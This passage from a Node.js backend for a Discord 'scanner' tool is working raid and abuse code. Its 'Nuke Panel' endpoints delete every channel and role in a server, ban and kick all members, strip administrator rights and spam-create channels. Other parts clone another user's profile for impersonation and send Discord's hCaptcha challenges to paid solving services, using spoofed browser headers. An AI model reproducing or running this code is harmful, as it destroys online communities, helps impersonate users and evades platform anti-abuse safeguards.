    }
    job.progress = `✅ ${job.closed} DMs fechadas`;
  });
});

app.post('/api/cl/delete-messages', (req, res) => {
  const { token } = req.body;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });
  const jobId = `cl-${Date.now()}`;
  clJobs.set(jobId, { status: 'running', done: false, progress: 'Buscando DMs...', processed: 0, total: 0 });
  res.json({ jobId });
  clJobRunner(jobId, token, async (job) => {
    const me = await discordRequest('/users/@me', token);
    const channels = await discordRequest('/users/@me/channels', token);
    const dms = (channels || []).filter(c => c.type === 1 || c.type === 3);
    for (const ch of dms) {
      let before = null;
      while (true) {
        const params = { limit: 100 };
        if (before) params.before = before;
        const msgs = await discordRequest(`/channels/${ch.id}/messages`, token, params).catch(() => []);
        if (!msgs || msgs.length === 0) break;
        const mine = msgs.filter(m => m.author?.id === me.id);
        job.total += mine.length;
        for (const m of mine) {
          try { await axios.delete(`${DISCORD_API}/channels/${ch.id}/messages/${m.id}`, { headers: { Authorization: token } }); job.processed++; } catch {}
          job.progress = `Apagando mensagens... ${job.processed}`;
          await sleep(1200);
        }
        before = msgs[msgs.length - 1].id;
        if (msgs.length < 100) break;
      }
    }
    job.progress = `✅ ${job.processed} mensagens apagadas`;
  });
});

app.post('/api/cl/remove-friends', (req, res) => {
  const { token } = req.body;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });
  const jobId = `cl-${Date.now()}`;
  clJobs.set(jobId, { status: 'running', done: false, progress: 'Buscando amigos...', removed: 0, total: 0 });
  res.json({ jobId });
  clJobRunner(jobId, token, async (job) => {
    const rels = await discordRequest('/users/@me/relationships', token);
    job.total = (rels || []).length;
    for (const r of (rels || [])) {
      try { await axios.delete(`${DISCORD_API}/users/@me/relationships/${r.id}`, { headers: { Authorization: token } }); job.removed++; } catch {}
      job.progress = `Removendo amigos... ${job.removed}/${job.total}`;
      await sleep(400);
    }
    job.progress = `✅ ${job.removed} amizades removidas`;
  });
});

app.post('/api/cl/leave-guilds', (req, res) => {
  const { token } = req.body;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });
  const jobId = `cl-${Date.now()}`;
  clJobs.set(jobId, { status: 'running', done: false, progress: 'Buscando servidores...', left: 0, total: 0 });
  res.json({ jobId });
  clJobRunner(jobId, token, async (job) => {
    const guilds = await discordRequest('/users/@me/guilds', token);
    const toLeave = (guilds || []).filter(g => !g.owner);
    job.total = toLeave.length;
    for (const g of toLeave) {
      try { await axios.delete(`${DISCORD_API}/users/@me/guilds/${g.id}`, { headers: { Authorization: token } }); job.left++; } catch {}
      job.progress = `Saindo de servidores... ${job.left}/${job.total}`;
      await sleep(600);
    }
    job.progress = `✅ Saiu de ${job.left} servidores`;
  });
});

app.post('/api/cl/cancel-requests', (req, res) => {
  const { token } = req.body;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });
  const jobId = `cl-${Date.now()}`;
  clJobs.set(jobId, { status: 'running', done: false, progress: 'Buscando pedidos...', removed: 0, total: 0 });
  res.json({ jobId });
  clJobRunner(jobId, token, async (job) => {
    const rels = await discordRequest('/users/@me/relationships', token);
    const pending = (rels || []).filter(r => r.type === 3 || r.type === 4); // 3=incoming, 4=outgoing
    job.total = pending.length;
    for (const r of pending) {
      try { await axios.delete(`${DISCORD_API}/users/@me/relationships/${r.id}`, { headers: { Authorization: token } }); job.removed++; } catch {}
      job.progress = `Cancelando pedidos... ${job.removed}/${job.total}`;
      await sleep(400);
    }
    job.progress = `✅ ${job.removed} pedidos cancelados`;
  });
});

app.post('/api/cl/delete-guild-messages', (req, res) => {
  const { token } = req.body;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });
  const jobId = `cl-${Date.now()}`;
  clJobs.set(jobId, { status: 'running', done: false, progress: 'Buscando servidores...', processed: 0, total: 0 });
  res.json({ jobId });
  clJobRunner(jobId, token, async (job) => {
    const me = await discordRequest('/users/@me', token);
    const guilds = await discordRequest('/users/@me/guilds', token);
    for (const g of (guilds || [])) {
      let channels = [];
      try { channels = await discordRequest(`/guilds/${g.id}/channels`, token); } catch { continue; }
      const textChannels = (channels || []).filter(c => c.type === 0 || c.type === 5);
      for (const ch of textChannels) {
        let before = null;
        for (let page = 0; page < 10; page++) {
          const params = { limit: 100 };
          if (before) params.before = before;
          const msgs = await discordRequest(`/channels/${ch.id}/messages`, token, params).catch(() => []);
          if (!msgs || msgs.length === 0) break;
          const mine = msgs.filter(m => m.author?.id === me.id);
          job.total += mine.length;
          for (const m of mine) {
            try { await axios.delete(`${DISCORD_API}/channels/${ch.id}/messages/${m.id}`, { headers: { Authorization: token } }); job.processed++; } catch {}
            job.progress = `Apagando msgs em servidores... ${job.processed}`;
            await sleep(1200);
          }
          before = msgs[msgs.length - 1].id;
          if (msgs.length < 100) break;
        }
      }
    }
    job.progress = `✅ ${job.processed} mensagens apagadas em servidores`;
  });
});

app.get('/api/cl/status/:jobId', (req, res) => {
  const job = clJobs.get(req.params.jobId);
  if (!job) return res.status(404).json({ error: 'Job não encontrado' });
  res.json(job);
});

// ─── Nuke Panel ────────────────────────────────────────────────
const nukeJobs = new Map();

async function nukeJobRunner(jobId, token, fn) {
  const job = nukeJobs.get(jobId);
  try { await fn(job); job.status = 'done'; job.done = true; }
  catch (e) { job.status = 'error'; job.done = true; job.progress = `❌ ${e.response?.data?.message || e.message}`; }
}

app.get('/api/nuke/:guildId/roles', async (req, res) => {
  const { token } = req.query;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });
  try {
    const roles = await discordRequest(`/guilds/${req.params.guildId}/roles`, token);
    res.json({ roles });
  } catch (e) { res.status(e.response?.status || 500).json({ error: e.response?.data?.message || e.message }); }
});

app.post('/api/nuke/:guildId/delete-channels', (req, res) => {
  const { token } = req.body; const { guildId } = req.params;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });
  const jobId = `nuke-${Date.now()}`;
  nukeJobs.set(jobId, { status: 'running', done: false, progress: 'Buscando canais...', deleted: 0, total: 0 });
  res.json({ jobId });
  nukeJobRunner(jobId, token, async (job) => {
    const channels = await discordRequest(`/guilds/${guildId}/channels`, token);
    job.total = (channels || []).length;
    for (const ch of (channels || [])) {
      try { await axios.delete(`${DISCORD_API}/channels/${ch.id}`, { headers: { Authorization: token } }); job.deleted++; } catch {}
      job.progress = `Deletando canais... ${job.deleted}/${job.total}`;
      await sleep(400);
    }
    job.progress = `✅ ${job.deleted} canais deletados`;
  });
});

app.post('/api/nuke/:guildId/ban-all', (req, res) => {
  const { token } = req.body; const { guildId } = req.params;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });
  const jobId = `nuke-${Date.now()}`;
  nukeJobs.set(jobId, { status: 'running', done: false, progress: 'Escaneando membros...', banned: 0, total: 0, errors: 0 });
  res.json({ jobId });
  nukeJobRunner(jobId, token, async (job) => {
    const me = await discordRequest('/users/@me', token);
    const inner = { found: 0, members: [], progress: '', status: 'running', done: false, mode: 'paginated', errors: 0, guildData: null, webhookUrl: null, flagMask: 0, boosterSelected: false, rareSent: 0 };
    await runScanJob(inner, guildId, token);
    const toban = inner.members.filter(m => m.user?.id && m.user.id !== me.id);
    job.total = toban.length;
    for (const m of toban) {
      try { await axios.put(`${DISCORD_API}/guilds/${guildId}/bans/${m.user.id}`, {}, { headers: { Authorization: token } }); job.banned++; } catch { job.errors++; }
      if (job.banned % 5 === 0) job.progress = `Banindo... ${job.banned}/${job.total}`;
      await sleep(350);
    }
    job.progress = `✅ ${job.banned} membros banidos (${job.errors} erros)`;
  });
});

app.post('/api/nuke/:guildId/remove-roles', (req, res) => {
  const { token } = req.body; const { guildId } = req.params;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });
  const jobId = `nuke-${Date.now()}`;
  nukeJobs.set(jobId, { status: 'running', done: false, progress: 'Escaneando membros...', processed: 0, total: 0, errors: 0 });
  res.json({ jobId });
  nukeJobRunner(jobId, token, async (job) => {
    const inner = { found: 0, members: [], progress: '', status: 'running', done: false, mode: 'paginated', errors: 0, guildData: null, webhookUrl: null, flagMask: 0, boosterSelected: false, rareSent: 0 };
    await runScanJob(inner, guildId, token);
    const withRoles = inner.members.filter(m => m.roles?.length > 0 && m.user?.id);
    job.total = withRoles.length;
    for (const m of withRoles) {
      try { await axios.patch(`${DISCORD_API}/guilds/${guildId}/members/${m.user.id}`, { roles: [] }, { headers: { Authorization: token, 'Content-Type': 'application/json' } }); job.processed++; } catch { job.errors++; }
      if (job.processed % 5 === 0) job.progress = `Removendo cargos... ${job.processed}/${job.total}`;
      await sleep(350);
    }
    job.progress = `✅ Cargos removidos de ${job.processed} membros`;
  });
});

app.post('/api/nuke/:guildId/remove-admins', (req, res) => {
  const { token, belowRoleId } = req.body; const { guildId } = req.params;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });
  const jobId = `nuke-${Date.now()}`;
  nukeJobs.set(jobId, { status: 'running', done: false, progress: 'Buscando cargos...', processed: 0, total: 0, errors: 0 });
  res.json({ jobId });
  nukeJobRunner(jobId, token, async (job) => {
    const roles = await discordRequest(`/guilds/${guildId}/roles`, token);
    const belowPos = belowRoleId ? ((roles || []).find(r => r.id === belowRoleId)?.position ?? 9999) : 9999;
    const ADMIN = 0x8n;
    const targets = (roles || []).filter(r => r.position < belowPos && (BigInt(r.permissions) & ADMIN) !== 0n);
    job.total = targets.length;
    for (const r of targets) {
      try {
        const newPerms = (BigInt(r.permissions) & ~ADMIN).toString();
        await axios.patch(`${DISCORD_API}/guilds/${guildId}/roles/${r.id}`, { permissions: newPerms }, { headers: { Authorization: token, 'Content-Type': 'application/json' } });
        job.processed++;
      } catch { job.errors++; }
      job.progress = `Removendo admin... ${job.processed}/${job.total}`;
      await sleep(300);
    }
    job.progress = `✅ Admin removido de ${job.processed} cargos`;
  });
});

app.post('/api/nuke/:guildId/kick-all', (req, res) => {
  const { token } = req.body; const { guildId } = req.params;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });
  const jobId = `nuke-${Date.now()}`;
  nukeJobs.set(jobId, { status: 'running', done: false, progress: 'Escaneando membros...', kicked: 0, total: 0, errors: 0 });
  res.json({ jobId });
  nukeJobRunner(jobId, token, async (job) => {
    const me = await discordRequest('/users/@me', token);
    const inner = { found: 0, members: [], progress: '', status: 'running', done: false, mode: 'paginated', errors: 0, guildData: null, webhookUrl: null, flagMask: 0, boosterSelected: false, rareSent: 0 };
    await runScanJob(inner, guildId, token);
    const tokick = inner.members.filter(m => m.user?.id && m.user.id !== me.id);
    job.total = tokick.length;
    for (const m of tokick) {
      try { await axios.delete(`${DISCORD_API}/guilds/${guildId}/members/${m.user.id}`, { headers: { Authorization: token } }); job.kicked++; } catch { job.errors++; }
      if (job.kicked % 5 === 0) job.progress = `Kickando... ${job.kicked}/${job.total}`;
      await sleep(350);
    }
    job.progress = `✅ ${job.kicked} membros kickados (${job.errors} erros)`;
  });
});

app.post('/api/nuke/:guildId/delete-roles', (req, res) => {
  const { token } = req.body; const { guildId } = req.params;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });
  const jobId = `nuke-${Date.now()}`;
  nukeJobs.set(jobId, { status: 'running', done: false, progress: 'Buscando cargos...', deleted: 0, total: 0, errors: 0 });
  res.json({ jobId });
  nukeJobRunner(jobId, token, async (job) => {
    const roles = await discordRequest(`/guilds/${guildId}/roles`, token);
    const deletable = (roles || []).filter(r => r.name !== '@everyone' && !r.managed);
    job.total = deletable.length;
    for (const r of deletable) {
      try { await axios.delete(`${DISCORD_API}/guilds/${guildId}/roles/${r.id}`, { headers: { Authorization: token } }); job.deleted++; } catch { job.errors++; }
      job.progress = `Deletando cargos... ${job.deleted}/${job.total}`;
      await sleep(300);
    }
    job.progress = `✅ ${job.deleted} cargos deletados`;
  });
});

app.post('/api/nuke/:guildId/spam-channels', (req, res) => {
  const { token, channelName = 'nuked', count = 20 } = req.body; const { guildId } = req.params;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });
  const jobId = `nuke-${Date.now()}`;
  const total = Math.min(500, Math.max(1, parseInt(count) || 20));
  nukeJobs.set(jobId, { status: 'running', done: false, progress: 'Criando canais...', processed: 0, total });
  res.json({ jobId });
  nukeJobRunner(jobId, token, async (job) => {
    for (let i = 0; i < total; i++) {
      try {
        await axios.post(`${DISCORD_API}/guilds/${guildId}/channels`,
          { name: channelName, type: 0 },
          { headers: { Authorization: token, 'Content-Type': 'application/json' } });
        job.processed++;
      } catch { job.errors = (job.errors || 0) + 1; }
      job.progress = `Criando canais... ${job.processed}/${total}`;
      await sleep(400);
    }
    job.progress = `✅ ${job.processed} canais criados`;
  });
});

app.post('/api/nuke/:guildId/rename-server', (req, res) => {
  const { token, name } = req.body; const { guildId } = req.params;
  if (!token || !name) return res.status(400).json({ error: 'Token e nome obrigatórios' });
  const jobId = `nuke-${Date.now()}`;
  nukeJobs.set(jobId, { status: 'running', done: false, progress: 'Renomeando...', total: 1, processed: 0 });
  res.json({ jobId });
  nukeJobRunner(jobId, token, async (job) => {
    await axios.patch(`${DISCORD_API}/guilds/${guildId}`, { name }, { headers: { Authorization: token, 'Content-Type': 'application/json' } });
    job.processed = 1;
    job.progress = `✅ Servidor renomeado para "${name}"`;
  });
});

app.get('/api/nuke/status/:jobId', (req, res) => {
  const job = nukeJobs.get(req.params.jobId);
  if (!job) return res.status(404).json({ error: 'Job não encontrado' });
  res.json(job);
});

// ─── Profile Clone ────────────────────────────────────────────────

app.post('/api/profile/fetch', async (req, res) => {
  const { token, userId } = req.body;
  if (!token || !userId) return res.status(400).json({ error: 'Token e userId obrigatórios' });
  try {
    let user = null, bio = '', pronouns = '', bannerUrl = null;
    // Try full profile first (has bio, pronouns, banner)
    try {
      const prof = await discordRequest(`/users/${userId}/profile?with_mutual_guilds=false`, token);
      user = prof.user || {};
      bio = prof.user_profile?.bio || '';
      pronouns = prof.user_profile?.pronouns || '';
      if (user.banner) {
        const ext = user.banner.startsWith('a_') ? 'gif' : 'png';
        bannerUrl = `https://cdn.discordapp.com/banners/${userId}/${user.banner}.${ext}?size=1024`;
      }
    } catch {}
    // Fallback to basic user endpoint
    if (!user?.id) {
      user = await discordRequest(`/users/${userId}`, token);
      if (user.banner) {
        const ext = user.banner.startsWith('a_') ? 'gif' : 'png';
        bannerUrl = `https://cdn.discordapp.com/banners/${userId}/${user.banner}.${ext}?size=1024`;
      }
    }
    const avatarUrl = user.avatar
      ? `https://cdn.discordapp.com/avatars/${userId}/${user.avatar}.${user.avatar.startsWith('a_') ? 'gif' : 'png'}?size=1024`
      : null;
    res.json({ id: user.id, username: user.username, global_name: user.global_name || '', avatarUrl, bannerUrl, bio, pronouns, accent_color: user.accent_color || null });
  } catch (err) {
    const status = err.response?.status || 500;
    const msg = err.response?.data?.message || err.message;
    res.status(status).json({ error: status === 401 ? 'Token inválido ou expirado' : status === 403 ? 'Sem servidor em comum com este usuário' : msg });
  }
});

// ── hCaptcha solver (multi-service) ────────────────────────────
const TASK_API = {
  capmonster: 'https://api.capmonster.cloud',
  anticaptcha: 'https://api.anti-captcha.com',
  capsolver:   'https://api.capsolver.com',
};
const TWOCAPTCHA_COMPAT = {
  '2captcha':  { in: 'https://2captcha.com/in.php',    res: 'https://2captcha.com/res.php' },
  ezcaptcha:   { in: 'https://api.ez-captcha.com/in.php', res: 'https://api.ez-captcha.com/res.php' },
  ruCaptcha:   { in: 'https://rucaptcha.com/in.php',   res: 'https://rucaptcha.com/res.php' },
};

async function solveCaptcha(sitekey, pageUrl, apiKey, rqdata = null, service = '2captcha') {
  const key = apiKey.trim();

  if (TASK_API[service]) {
    // ── Task-based API (CapMonster, Anti-Captcha, CapSolver) ──
    const base = TASK_API[service];
    const task = { type: 'HCaptchaTaskProxyless', websiteURL: pageUrl, websiteKey: sitekey };
    if (rqdata) {
      if (service === 'capsolver') task.enterprisePayload = { rqdata };
      else task.data = rqdata;
    }
    const create = await axios.post(`${base}/createTask`, { clientKey: key, task });
    if (create.data.errorId !== 0) throw new Error(`${service}: ${create.data.errorDescription}`);
    const taskId = create.data.taskId;
    for (let i = 0; i < 30; i++) {
      await sleep(5000);
      const r = await axios.post(`${base}/getTaskResult`, { clientKey: key, taskId });
      if (r.data.errorId !== 0) throw new Error(`${service}: ${r.data.errorDescription}`);
      if (r.data.status === 'ready') return r.data.solution.gRecaptchaResponse;
    }
    throw new Error(`${service}: timeout`);
  } else {
    // ── 2captcha-compatible API ──
    const ep = TWOCAPTCHA_COMPAT[service] || TWOCAPTCHA_COMPAT['2captcha'];
    const params = { key, method: 'hcaptcha', sitekey, pageurl: pageUrl, json: 1 };
    if (rqdata) params.data = rqdata;
    const submit = await axios.post(ep.in, null, { params });
    if (submit.data.status !== 1) throw new Error(`${service}: ${submit.data.request}`);
    const id = submit.data.request;
    for (let i = 0; i < 30; i++) {
      await sleep(5000);
      const poll = await axios.get(ep.res, { params: { key, action: 'get', id, json: 1 } });
      if (poll.data.status === 1) return poll.data.request;
      if (poll.data.request !== 'CAPCHA_NOT_READY') throw new Error(`${service}: ${poll.data.request}`);
    }
    throw new Error(`${service}: timeout`);
  }
}

app.post('/api/profile/apply', async (req, res) => {
  const { token, fields, captchaApiKey, captchaService = '2captcha' } = req.body;
  if (!token || !fields) return res.status(400).json({ error: 'Token e fields obrigatórios' });
  const SP = Buffer.from(JSON.stringify({ os: 'Windows', browser: 'Chrome', device: '', system_locale: 'pt-BR', browser_user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', browser_version: '124.0.0.0', os_version: '10', release_channel: 'stable', client_build_number: 311844, client_event_source: null })).toString('base64');
  const headers = {
    Authorization: token,
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'X-Super-Properties': SP,
    'X-Discord-Locale': 'pt-BR',
    Origin: 'https://discord.com',
    Referer: 'https://discord.com/channels/@me',
  };
  const applied = [];
  const errors = [];

  const patchMe = async (body, captchaToken = null) => {
    const reqHeaders = { ...headers };
    if (captchaToken) reqHeaders['X-Captcha-Key'] = captchaToken;
    try {
      await axios.patch(`${DISCORD_API}/users/@me`, body, { headers: reqHeaders });
    } catch (err) {
      const status = err.response?.status;
      const data = err.response?.data || {};
      if (data.captcha_key) {
        console.error('[patchMe] CAPTCHA — service:', data.captcha_service, '| sitekey:', data.captcha_sitekey, '| rqdata:', data.captcha_rqdata ? data.captcha_rqdata.slice(0,40) : 'none');
        if (captchaApiKey) {
          console.log('[patchMe] Resolvendo CAPTCHA via 2captcha...');
          const sitekey = data.captcha_sitekey || 'a9b5fb07-92ff-493f-86fe-352a2803b3df';
          const solution = await solveCaptcha(sitekey, 'https://discord.com/channels/@me', captchaApiKey, data.captcha_rqdata || null, captchaService);
          console.log('[patchMe] CAPTCHA resolvido, reenviando...');
          return patchMe(body, solution);
        }
      }
      if (data.code === 50035) console.error('[patchMe] 50035:', JSON.stringify(data.errors || {}));
      else console.error('[patchMe] status:', status, '| message:', data.message || err.message);
      throw err;
    }
  };
  const patchProfile = async (body) => {
    await axios.patch(`${DISCORD_API}/users/@me/profile`, body, { headers });
  };
  const errMsg = (err, fallback) => {
    const data = err.response?.data || {};
    const status = err.response?.status;
    if (data.captcha_key) return `${fallback}: CAPTCHA exigido — tente novamente mais tarde`;
    if (data.code === 40062) return `${fallback}: rate limit — tente novamente em ${data.retry_after || '?'}s`;
    if (data.code === 50035) {
      const bannerErr = data.errors?.banner?._errors?.[0]?.code;
      if (bannerErr === 'BANNER_RATE_LIMIT') return `${fallback}: mudando banner rápido demais, aguarde`;
      return `${fallback}: requer Nitro ou valor inválido`;
    }
    const msg = (typeof data === 'object' ? data.message : null) || err.message || fallback;
    if (status === 403 || (msg && msg.toLowerCase().includes('nitro'))) return `${fallback}: requer Nitro`;
    return `${fallback}: ${msg}`;
  };

  // Avatar
  if (fields.avatarUrl) {
    try {
      const r = await axios.get(fields.avatarUrl, { responseType: 'arraybuffer', timeout: 15000 });
      await patchMe({ avatar: `data:${r.headers['content-type']};base64,${Buffer.from(r.data).toString('base64')}` });
      applied.push('Avatar');
    } catch (err) { errors.push(errMsg(err, 'Avatar')); }
    await sleep(800);
  }

  // Banner
  if (fields.bannerUrl) {
    try {
      const r = await axios.get(fields.bannerUrl, { responseType: 'arraybuffer', timeout: 15000 });
      await patchMe({ banner: `data:${r.headers['content-type']};base64,${Buffer.from(r.data).toString('base64')}` });
      applied.push('Banner');
    } catch (err) { errors.push(errMsg(err, 'Banner (requer Nitro)')); }
    await sleep(1200);
  }

  // Display name
  if (fields.global_name !== undefined && fields.global_name !== null) {
    try {
      await patchMe({ global_name: fields.global_name || null });
      applied.push('Display Name');
    } catch (err) { errors.push(errMsg(err, 'Display Name')); }
    await sleep(600);
  }

  // Accent color
  if (fields.accent_color !== undefined) {
    try {
      await patchMe({ accent_color: fields.accent_color });
      applied.push('Cor');
    } catch (err) { errors.push(errMsg(err, 'Cor')); }
    await sleep(600);
  }

  // Bio (requires Nitro)
  if (fields.bio !== undefined) {
    try {
      await patchProfile({ bio: fields.bio || '' });
      applied.push('Bio');
    } catch (err) { errors.push(errMsg(err, 'Bio (requer Nitro)')); }
  }

  // Pronouns
  if (fields.pronouns !== undefined) {
    try {
      await patchProfile({ pronouns: fields.pronouns || '' });
      applied.push('Pronomes');
    } catch (err) { errors.push(errMsg(err, 'Pronomes')); }
  }

  res.json({ success: applied.length > 0, applied, errors });
});

if (fs.existsSync(distPath)) {
  app.get('*', (req, res) => {
    if (!req.path.startsWith('/api')) {
      res.sendFile(path.join(distPath, 'index.html'));
    }
  });
}

app.listen(PORT, () => {
  console.log(`✅ Discord Scanner API running on http://localhost:${PORT}`);
});
